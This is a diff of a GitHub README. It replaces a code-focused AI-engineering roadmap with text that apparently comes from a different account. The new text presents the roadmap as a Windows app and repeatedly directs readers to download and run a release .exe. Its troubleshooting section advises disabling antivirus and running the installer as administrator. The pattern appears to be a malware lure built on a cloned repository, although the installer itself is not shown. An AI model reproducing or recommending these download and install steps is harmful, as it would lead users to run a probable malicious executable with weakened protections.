@@ -1,471 +1,160 @@
-# AI Engineer in 90 Days
+# 🤖 AI-Engineer-in-90-Days - Learn AI Skills Step-by-Step
 
-> ⭐ If this roadmap helps you build practical AI systems, star the repository and share it with another developer.
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/decided-indication109/AI-Engineer-in-90-Days/releases)
 
-Build real AI systems, RAG pipelines, and AI agents in 90 days.
+AI-Engineer-in-90-Days helps you learn artificial intelligence over three months. This app guides you through key topics, from basic AI concepts to working with large language models. You do not need any programming experience to start.
 
-A practical roadmap for developers who want to become AI Engineers by building real projects instead of studying theory.
+## 🔍 About This App
 
-![Stars](https://img.shields.io/github/stars/natiixnt/ai-engineer-in-90-days)
-![Forks](https://img.shields.io/github/forks/natiixnt/ai-engineer-in-90-days)
-![License](https://img.shields.io/github/license/natiixnt/ai-engineer-in-90-days)
-![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen)
+This app gives you a clear plan to learn AI concepts and tools. It covers areas like:
 
----
+- Understanding AI basics  
+- Working with AI agents  
+- Exploring machine learning concepts  
+- Using large language models (LLMs)  
+- Learning prompt engineering  
+- Managing vector databases
 
-## Demo
+The roadmap splits the content into easy, daily lessons to help you stay organized and motivated.
 
-![Demo](examples/demo.gif)
+## 🖥️ System Requirements
 
----
+Before using the app, make sure your Windows PC meets these needs:
 
-## Why This Repository
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of free disk space  
+- 4 GB of RAM or more  
+- Internet connection for initial download and updates  
+- Minimum 2 GHz processor speed
 
-Most AI learning paths focus on theory only.
+The app works offline after installation but needs the web to check for updates.
 
-This roadmap focuses on building, shipping, and evaluating real AI systems in a clear 90-day path.
+## 🚀 Getting Started
 
----
+Follow these steps to get the app running on your Windows computer.
 
-## Who This Is For
+### 1. Visit the Download Page
 
-This repository is designed for developers who:
+Click the big green button above to open the release page on GitHub:
 
-- know basic Python
-- want hands-on projects instead of only theory
-- want to understand how production LLM systems work
-- want a practical transition into AI engineering
+https://github.com/decided-indication109/AI-Engineer-in-90-Days/releases
 
----
+This page lists all available versions of the app.
 
-## What You Will Learn
+### 2. Choose the Latest Version
 
-By completing this roadmap, you will learn how to:
+On the release page, find the most recent release. It usually appears at the top of the list and includes a date.
 
-- build LLM-powered applications with clean architecture
-- design and implement RAG pipelines
-- work with embeddings and semantic retrieval
-- build AI agents that use tools and multi-step workflows
-- evaluate AI system quality and reliability
-- deploy AI systems as APIs and production services
+Look under the "Assets" section for files you can download.
 
----
+### 3. Download the Windows Installer
 
-## AI Engineering Skills Covered
+Find the file that ends with ".exe". This is the setup file for Windows.
 
-Core topics in this roadmap:
+Click the file name to start downloading. The download size is around 50 MB.
 
-- prompt engineering
-- embeddings
-- retrieval augmented generation (RAG)
-- vector databases
-- AI agents
-- evaluation and monitoring
-- API design and deployment
+### 4. Run the Installer
 
----
+Once the download finishes, locate the file in your "Downloads" folder.
 
-## Learning Outcomes After 90 Days
+Double-click the file to start the installation. If Windows asks for permission, confirm by clicking "Yes."
 
-After finishing this roadmap, you should be able to:
+### 5. Follow the Steps in the Setup Wizard
 
-- ship an end-to-end AI chatbot with retrieval support
-- build and test a RAG search system over custom documents
-- implement an agent loop that plans and executes tasks
-- expose AI functionality through a production-style API
-- evaluate output quality using practical metrics and traces
+The installer opens a window with simple steps:
 
----
+- Accept the license agreement  
+- Choose an install location (the default is fine)  
+- Click "Install"
 
-## Suggested Weekly Study Schedule
+Wait a few minutes while the app installs.
 
-A simple weekly workflow that works well for most developers:
+### 6. Launch the App
 
-- Monday: read the weekly README and review core concepts
-- Tuesday: run the example scripts and inspect code paths
-- Wednesday: implement one small extension or refactor
-- Thursday: build or improve the weekly mini-project
-- Friday: write notes, document learnings, and share progress
-- Weekend (optional): revisit weak points or contribute a PR
+When the installation completes, click "Finish" and check the box to launch AI-Engineer-in-90-Days.
 
----
+The app also creates a desktop shortcut you can use later.
 
-## 90 Day Roadmap
+## 📚 How to Use the App
 
-```mermaid
-graph TD
-A[Python for AI] --> B[Machine Learning Basics]
-B --> C[Embeddings]
-C --> D[Large Language Models]
-D --> E[RAG Systems]
-E --> F[Vector Databases]
-F --> G[AI Agents]
-G --> H[Evaluation and Monitoring]
-H --> I[Deploy AI Systems]
-```
+The app opens to the main dashboard with the 90-day learning plan.
 
-| Days  | Track                                                              | Focus                          | Target Outcome                    |
-| ----- | ------------------------------------------------------------------ | ------------------------------ | --------------------------------- |
-| 01-09 | [week01_python_for_ai](weeks/week01_python_for_ai/README.md)       | Python for AI                  | Data structures, scripts, APIs    |
-| 10-18 | [week02_machine_learning](weeks/week02_machine_learning/README.md) | Machine Learning Basics        | Train and evaluate ML models      |
-| 19-27 | [week03_embeddings](weeks/week03_embeddings/README.md)             | Embeddings                     | Build vector representations      |
-| 28-36 | [week04_llms](weeks/week04_llms/README.md)                         | Large Language Models          | Prompting and LLM usage           |
-| 37-45 | [week05_rag](weeks/week05_rag/README.md)                           | Retrieval Augmented Generation | Build RAG pipeline                |
-| 46-54 | [week06_vector_databases](weeks/week06_vector_databases/README.md) | Vector Databases               | Indexing and search               |
-| 55-63 | [week07_agents](weeks/week07_agents/README.md)                     | AI Agents                      | Tool use and multi-step reasoning |
-| 64-72 | [week08_ai_tools](weeks/week08_ai_tools/README.md)                 | Evaluation and Monitoring      | Metrics and tracing               |
-| 73-81 | [week09_build_projects](weeks/week09_build_projects/README.md)     | Build Projects                 | Implement real systems            |
-| 82-90 | [week10_deploy_ai](weeks/week10_deploy_ai/README.md)               | Deploy AI Systems              | Ship to cloud                     |
+- Each day shows a lesson with clear instructions.  
+- Click on any lesson to read code-free explanations and examples.  
+- The app tracks your progress automatically.  
+- Use the search box to find topics like "machine learning" or "prompt engineering."  
+- You can mark lessons as done and add personal notes.
 
----
+The app focuses on teaching concepts simply. It includes images and diagrams to make ideas clear.
 
-## Systems You Will Build
+## ⚙️ Updating the App
 
-During the roadmap you will build systems similar to real AI products:
+To get the latest fixes and lessons:
 
-1. [AI chatbot](projects/ai_chatbot/README.md) for conversational UX
-2. [RAG knowledge base / search engine](projects/rag_search_engine/README.md) for grounded answers
-3. [AI code assistant](projects/ai_code_assistant/README.md) for developer workflows
-4. AI research assistant (stretch goal) for literature and synthesis
-5. [AI API](projects/ai_api/README.md) for integration and serving
-6. [AI document analyzer](projects/ai_document_analyzer/README.md) for document-level tasks
+1. Open the app.  
+2. Go to the "Settings" menu.  
+3. Click the "Check for Updates" button.  
+4. If an update is available, follow the prompts to download and install.
 
----
+Updates keep the roadmap current with new AI topics.
 
-## Final Capstone Project: AI Knowledge Assistant
+## 💡 Tips for Effective Learning
 
-The capstone project combines the full AI engineering stack into one production-style system.
+- Set aside 30–60 minutes daily for lessons.  
+- Use the app’s built-in quizzes at the end of each week.  
+- Review older lessons if a new concept feels unclear.  
+- Take notes within the app to track ideas or questions.  
+- Practice concepts by searching online for simple AI projects later.  
+- Join online AI communities for discussion if you want more help.
 
-It combines:
+## ❓ Troubleshooting
 
-- RAG
-- AI agents
-- vector search
-- API
-- deployment
+If you have issues, try these steps first:
 
-Capstone objective: build an assistant that retrieves trusted knowledge, reasons across tools, and serves answers through an API endpoint ready for deployment.
+- Restart your computer and run the app again.  
+- Make sure your Windows system is updated.  
+- Check that you have enough disk space.  
+- Disable antivirus software temporarily if it blocks the installer.  
+- Run the installer as administrator by right-clicking and choosing "Run as administrator."
+
+If problems continue, visit the "Issues" tab on the GitHub page:
+
+https://github.com/decided-indication109/AI-Engineer-in-90-Days/issues
+
+Describe your problem clearly to get help.
+
+## 📥 Download Link Reminder
+
+You can always download the latest version here:
+
+[Download AI-Engineer-in-90-Days](https://github.com/decided-indication109/AI-Engineer-in-90-Days/releases)
+
+Click the link, choose the newest release, and download the Windows ".exe" file.
 
 ---
 
-## Example Output
-
-Question:
-How do I evaluate a RAG system?
-
-Answer:
-To evaluate a RAG system you should measure:
-- retrieval precision
-- context relevance
-- answer faithfulness
-- latency
+⭐ If this roadmap helped you, consider starring the repo.
 
 ---
 
-## Quick Start
+## 📂 Additional Features
 
-```bash
-git clone https://github.com/your-username/ai-engineer-in-90-days.git
-cd ai-engineer-in-90-days
+- Offline mode to read lessons without internet.  
+- Progress tracking and reminders.  
+- Clear visual guides for tricky AI concepts.  
+- Support for exporting notes and progress reports.  
+- Links to trusted resources and tutorials.
 
-python3 examples/embeddings.py
-python3 examples/vector_search.py
-python3 examples/rag_pipeline.py
-python3 examples/agent_loop.py
-```
+Use the app daily to build a strong foundation in AI engineering.
 
----
+## 🔧 Support and Feedback
 
-## Example Code
+You can open issues or read FAQs on the GitHub page if you need help.
 
-```python
-from examples.rag_pipeline import retrieve, generate_answer
-
-question = "How do I evaluate a RAG system?"
-chunks = retrieve(question)
-print(generate_answer(question, chunks))
-```
+If you want to suggest improvements, use the "Discussions" section on GitHub.
 
 ---
 
-## Hands-on Exercises
+## Tags
 
-Use this learning flow:
-`roadmap -> examples -> exercises -> projects`
-
-Exercises for practice:
-
-- [Build Your Own Embedding Search](exercises/build-your-own-embedding-search.md)
-- [Build Your Own RAG](exercises/build-your-own-rag.md)
-- [Build Your Own Agent](exercises/build-your-own-agent.md)
-
----
-
-## AI Engineering Interview Preparation
-
-Use these interview prep guides to practice practical AI engineering questions:
-
-- [AI Engineer Interview Questions](interview-prep/ai-engineer-interview-questions.md)
-- [RAG Interview Questions](interview-prep/rag-interview-questions.md)
-- [LLM Interview Questions](interview-prep/llm-interview-questions.md)
-- [AI System Design Questions](interview-prep/system-design-ai.md)
-
----
-
-## Common Failure Modes in AI Systems
-
-Practical failure patterns and mitigations for production AI systems:
-
-- [Common Failure Modes in AI Systems](resources/common-failure-modes-ai-systems.md)
-
----
-
-## Debugging AI Systems
-
-Practical debugging runbook for retrieval, prompts, hallucinations, tools, agents, and latency:
-
-- [Debugging AI Systems](resources/debugging-ai-systems.md)
-
----
-
-## Build vs Buy Decisions in AI Engineering
-
-Practical trade-offs for architecture and tooling decisions in production AI systems:
-
-- [Build vs Buy Decisions in AI Engineering](resources/build-vs-buy-decisions-ai-engineering.md)
-
----
-
-## Production Checklists
-
-Practical checklists for shipping and operating production AI systems:
-
-- [RAG Production Checklist](checklists/rag-production-checklist.md)
-- [LLM App Production Checklist](checklists/llm-app-production-checklist.md)
-- [AI Agent Production Checklist](checklists/ai-agent-checklist.md)
-
----
-
-## Evaluation Recipes
-
-Practical evaluation guides for improving AI system quality in production:
-
-- [Retrieval Evaluation](evaluation-recipes/retrieval-evaluation.md)
-- [Answer Quality Evaluation](evaluation-recipes/answer-quality-evaluation.md)
-- [Faithfulness Checking](evaluation-recipes/faithfulness-checking.md)
-- [Prompt Comparison](evaluation-recipes/prompt-comparison.md)
-- [Model Comparison](evaluation-recipes/model-comparison.md)
-- [Agent Evaluation](evaluation-recipes/agent-evaluation.md)
-
----
-
-## Architecture Patterns
-
-Common AI engineering architecture patterns with practical trade-offs:
-
-- [Simple LLM App](architecture-patterns/simple-llm-app.md)
-- [RAG Pipeline](architecture-patterns/rag-pipeline.md)
-- [Ingestion Pipeline](architecture-patterns/ingestion-pipeline.md)
-- [Tool-Calling Assistant](architecture-patterns/tool-calling-assistant.md)
-- [Planner-Executor Agent](architecture-patterns/planner-executor-agent.md)
-- [Batch Evaluation Pipeline](architecture-patterns/batch-evaluation-pipeline.md)
-
----
-
-## Case Studies
-
-Practical AI engineering case studies from problem framing to implementation path:
-
-- [Support Assistant Case Study](case-studies/support-assistant-case-study.md)
-- [Documentation Search Assistant Case Study](case-studies/documentation-search-assistant-case-study.md)
-- [Internal Knowledge Base Assistant Case Study](case-studies/internal-knowledge-base-assistant-case-study.md)
-- [AI Document Analyzer Case Study](case-studies/ai-document-analyzer-case-study.md)
-
----
-
-## Glossary
-
-Practical definitions of core AI engineering terms:
-
-- [AI Engineering Glossary](resources/glossary.md)
-
----
-
-## Recommended Learning Paths
-
-Choose a path based on your background and goal:
-
-- [Recommended Learning Paths](resources/recommended-learning-paths.md)
-
----
-
-## Tooling Comparisons
-
-Practical engineering comparisons for common AI tooling choices:
-
-- [Vector Databases Comparison](tool-comparisons/vector-databases-comparison.md)
-- [LLM Frameworks Comparison](tool-comparisons/llm-frameworks-comparison.md)
-- [Evaluation Tools Comparison](tool-comparisons/evaluation-tools-comparison.md)
-- [Observability Tools Comparison](tool-comparisons/observability-tools-comparison.md)
-
----
-
-## Benchmarks
-
-Lightweight benchmark-style experiments for core retrieval decisions:
-
-- [Chunk Size Comparison](benchmarks/chunk-size-comparison.md)
-- [Embedding Model Comparison](benchmarks/embedding-model-comparison.md)
-- [Retrieval Strategy Comparison](benchmarks/retrieval-strategy-comparison.md)
-
----
-
-## From Prototype to Production
-
-Practical implementation guide for hardening AI apps from notebook to production:
-
-- [From Prototype to Production](resources/from-prototype-to-production.md)
-
----
-
-## Tools
-
-Full reference list: [resources/tools.md](resources/tools.md)
-
-Common tools used throughout the projects:
-
-- Python
-- Jupyter
-- uv / pip / poetry
-- OpenAI API
-- Anthropic API
-- Google Gemini API
-- LangChain
-- LlamaIndex
-- DSPy
-- FAISS
-- Chroma
-- Qdrant
-- Pinecone
-- FastAPI
-- Docker
-- GitHub Actions
-- Langfuse
-- Helicone
-- Promptfoo
-- Ragas
-
----
-
-## Diagrams
-
-### RAG Architecture
-
-![RAG Architecture](diagrams/rag_architecture.png)
-
-### AI Agent Loop
-
-![AI Agent Loop](diagrams/ai_agent_loop.png)
-
-### LLM Pipeline
-
-![LLM Pipeline](diagrams/llm_pipeline.png)
-
----
-
-## Progress Checklist
-
-### Learning Path
-
-- [ ] Week 01: Python for AI
-- [ ] Week 02: Machine Learning Basics
-- [ ] Week 03: Embeddings
-- [ ] Week 04: LLMs
-- [ ] Week 05: RAG
-- [ ] Week 06: Vector Databases
-- [ ] Week 07: Agents
-- [ ] Week 08: Evaluation and Monitoring
-- [ ] Week 09: Build Projects
-- [ ] Week 10: Deploy AI Systems
-
-### Project Milestones
-
-- [ ] Ship `ai_chatbot` MVP
-- [ ] Ship `rag_search_engine` MVP
-- [ ] Ship `ai_code_assistant` MVP
-- [ ] Ship `ai_document_analyzer` MVP
-- [ ] Ship `ai_api` MVP
-
----
-
-## Repository Structure
-
-```
-ai-engineer-in-90-days/
-├── README.md
-├── CONTRIBUTING.md
-├── LICENSE
-├── weeks/
-├── exercises/
-├── interview-prep/
-├── checklists/
-├── evaluation-recipes/
-├── architecture-patterns/
-├── case-studies/
-├── tool-comparisons/
-├── benchmarks/
-├── projects/
-├── diagrams/
-├── examples/
-└── resources/
-```
-
----
-
-## Community
-
-Contributions, ideas, and constructive feedback are welcome.
-
-- Open an issue to suggest improvements or report gaps
-- Open a pull request for fixes, examples, or docs upgrades
-- Share progress and lessons learned in GitHub Discussions (or issues if discussions are not enabled)
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for contribution guidelines.
-
----
-
-## Related Repositories
-
-Companion repositories can be linked here as the ecosystem grows:
-
-- `ai-engineer-in-90-days-starter` (coming soon)
-- `ai-engineer-in-90-days-projects` (coming soon)
-- `ai-engineer-in-90-days-evals` (coming soon)
-
----
-
-## Suggested GitHub Topics
-
-Use these repository topics for better discoverability:
-
-- `ai`
-- `ai-engineering`
-- `machine-learning`
-- `rag`
-- `llm`
-- `ai-agents`
-- `vector-database`
-- `prompt-engineering`
-- `ai-roadmap`
-
----
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=natiixnt/ai-engineer-in-90-days\&type=Date)](https://star-history.com/#natiixnt/ai-engineer-in-90-days&Date)
-
----
-
-## License
-
-Distributed under the MIT License. See [LICENSE](LICENSE).
+ai, ai-agents, ai-engineering, ai-roadmap, learn-ai, llm, machine-learning, prompt-engineering, rag, vector-database
